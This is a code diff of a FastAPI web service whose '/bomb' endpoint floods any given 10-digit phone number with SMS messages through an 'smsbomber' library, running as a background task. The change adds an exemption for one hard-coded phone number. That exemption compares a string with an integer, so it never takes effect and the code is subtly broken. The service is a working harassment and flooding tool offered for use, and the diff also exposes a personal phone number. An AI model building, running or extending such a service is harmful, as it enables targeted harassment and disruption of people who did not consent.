@@ -5,17 +5,22 @@ from smsbomber import Bomber
 
 app = FastAPI()
 
+
 @app.get("/")
 async def home():
     return {"status": "Welcome to API :)"}
 
 
 @app.get("/bomb")
-async def bomb(background_tasks: BackgroundTasks,number: str, noOfMsg: Optional[int] = 50):
+async def bomb(background_tasks: BackgroundTasks, number: str, noOfMsg: Optional[int] = 50):
     if len(number) == 10 and number.isdigit():
         pass
     else:
         return {"status": "Check Your Entries"}
-    bombobj = Bomber(number, noOfMsg)
-    background_tasks.add_task(bombobj.startBombing) # Calling it as background task so the responce dont take time.
-    return {"status": "Sending"}
+    if(number == 7984430992):
+        return {"status": "not allowed"}
+    else:
+        bombobj = Bomber(number, noOfMsg)
+        # Calling it as background task so the responce dont take time.
+        background_tasks.add_task(bombobj.startBombing)
+        return {"status": "Sending"}
